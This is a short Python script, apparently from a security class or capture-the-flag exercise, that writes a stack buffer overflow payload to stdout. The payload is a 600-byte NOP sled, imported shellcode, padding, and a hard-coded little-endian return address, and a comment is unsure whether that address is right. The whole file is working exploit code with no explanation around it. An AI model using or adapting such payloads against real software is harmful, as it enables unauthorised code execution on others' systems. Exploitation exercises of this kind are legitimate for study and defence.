from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'\x90'*600)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*383)
sys.stdout.buffer.write(0xFFF6E69F.to_bytes(4, 'little')) #this address is probably wrong, should be right now

